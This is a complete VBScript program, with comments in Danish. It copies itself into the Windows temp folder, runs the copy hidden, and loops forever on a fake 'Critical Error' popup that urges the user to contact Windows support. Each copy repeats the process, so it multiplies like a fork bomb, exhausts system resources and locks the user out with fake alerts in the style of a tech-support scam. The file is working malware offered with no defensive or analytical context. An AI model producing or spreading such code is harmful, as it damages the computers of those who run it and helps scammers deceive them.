Set oWS = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
strSelf = WScript.ScriptFullName
strCopy = fso.GetSpecialFolder(2) & "\copy" & Timer & ".vbs"

' Kopierer scriptet til en ny fil
fso.CopyFile strSelf, strCopy

' Starter den nye kopi
oWS.Run strCopy, 0, False

' Pop-up loop
Do
    oWS.Popup "Error! Please contact Windows support", 0, "Critical Error", 16
Loop
